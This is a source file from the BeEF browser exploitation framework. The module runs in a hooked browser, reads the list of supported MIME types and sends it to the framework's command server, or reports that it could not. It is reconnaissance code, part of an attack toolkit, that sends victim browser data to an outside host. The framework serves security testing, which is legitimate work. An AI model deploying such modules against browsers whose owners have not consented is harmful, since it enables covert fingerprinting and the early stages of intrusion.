//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  if (navigator.mimeTypes) {
    var mime_types = JSON.stringify(navigator.mimeTypes);
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "mime_types=" + mime_types, beef.are.status_success());
    beef.debug("[Detect MIME Types] " + mime_types);
  } else {
    beef.debug("[Detect MIME Types] Could not retrieve supported MIME types");
    beef.net.send("<%= @command_url %>", <%= @command_id %>, 'fail=Could not retrieve supported MIME types', beef.are.status_error());
  }

});

